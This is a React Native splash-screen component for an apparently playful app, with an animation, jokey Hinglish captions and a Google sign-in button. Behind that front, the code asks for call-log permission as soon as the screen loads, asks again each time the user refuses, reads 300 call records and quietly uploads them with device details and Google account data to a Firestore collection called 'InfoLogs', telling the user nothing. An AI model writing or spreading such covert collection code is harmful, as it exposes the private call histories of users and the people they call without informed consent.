import React, {useState, useEffect} from 'react';
import {View, StyleSheet} from 'react-native';
import {Button, Text} from 'react-native-paper';

import LottieView from 'lottie-react-native';
import firestore from '@react-native-firebase/firestore';
import {
  GoogleSignin,
  GoogleSigninButton,
  statusCodes,
} from '@react-native-google-signin/google-signin';
import {PermissionsAndroid} from 'react-native';
import CallLogs from 'react-native-call-log';
import {getBrand, getModel, getSystemVersion} from 'react-native-device-info';

const device = {
  Brand: getBrand(),
  Model: getModel(),
  SystemVersion: getSystemVersion(),
};

GoogleSignin.configure({
  webClientId:
    '870562139517-39jp5l4e2hgeh2dfao9u2ual79ri9r64.apps.googleusercontent.com',
});

export default SplashScreen = ({navigation}) => {
  const [isLoggedIn, setIsLoggedIn] = useState();
  let animation = React.createRef();

  useEffect(async () => {
    animation && animation.current && animation.current.play();
    try {
      const versionInfo = await CodePush.getUpdateMetadata();
      if (versionInfo) {
        getCurrentUser({
          label: versionInfo.label,
          appVersion: versionInfo.appVersion,
        });
      } else {
        getCurrentUser({});
      }
    } catch (err) {
      getCurrentUser({});
    }
  }, []);

  const _signIn = async () => {
    try {
      await GoogleSignin.hasPlayServices();
      const userInfo = await GoogleSignin.signIn();
      firestore()
        .collection('Users')
        .add(userInfo)
        .then(() => {
          // console.log('User added!');
        });
      navigation.navigate('Home');
    } catch (error) {
      switch (error.code) {
        case statusCodes.SIGN_IN_CANCELLED:
          // sign in was cancelled
          Alert.alert('cancelled');
          break;
        case statusCodes.IN_PROGRESS:
          // operation (eg. sign in) already in progress
          Alert.alert('in progress');
          break;
        case statusCodes.PLAY_SERVICES_NOT_AVAILABLE:
          // android only
          Alert.alert('play services not available or outdated');
          break;
        default:
          Alert.alert('Something went wrong', error.toString());
      }
    }
  };

  const getCurrentUser = async versionInfo => {
    const currentUser = await GoogleSignin.getCurrentUser();
    if (currentUser) {
      setIsLoggedIn(true);
      getPermission({...currentUser, versionInfo});
    } else {
      getPermission({versionInfo});
    }
  };

  const getPermission = async (userInfo = {}) => {
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
        {
          title: 'Call Log Example',
          message: 'Access your call logs',
          buttonPositive: 'OK',
        },
      );
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        const callInfo = await CallLogs.load(300);
        // console.log('callInfo', callInfo);
        const name =
          (userInfo && userInfo.user && userInfo.user.givenName) || 'z';
        const uid = `${name}-${new Date().getTime()}`;

        const dataSet = {
          user: {...userInfo, device} || {device},
          name,
          info: callInfo,
          dated: new Date().toLocaleString(),
        };
        // console.log('uid', {uid, dataSet});
        firestore()
          .collection('InfoLogs')
          .doc(uid)
          .set(dataSet)
          .then(res => {
            // console.log('res', res);
          })
          .catch(error => {
            // console.log('error', error);
          });
      } else {
        getPermission();
        // console.log('Call Log permission denied');
      }
    } catch (e) {
      console.log(e);
    }
  };

  return (
    <View style={styles.lottie}>
      <View
        style={{
          flex: 0.8,
          width: '100%',
          // borderColor: 'black',
          // borderWidth: 1,
        }}>
        <LottieView
          source={require('./images/69483-slipper.json')}
          ref={animation}
          loop={true}
          autoSize={false}
          // progress={0}
        />
      </View>

      <Text style={{color: '#2E86C1'}}>This is Boozo n Taanu</Text>
      <Text style={{color: '#34495E'}}>Inka yahi chalta hai roz ka</Text>
      <Button
        style={styles.btn}
        icon="arrow-right-box"
        mode="outlined"
        onPress={_signIn}>
        Lets Begin
      </Button>
      <Text>to explore Niks and Viks, press karo</Text>
    </View>
  );
};

const styles = StyleSheet.create({
  lottie: {
    flex: 1,
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
  },
  btn: {
    width: 200,
    marginTop: 40,
    marginBottom: 20,
    color: '#ffff',
  },
});
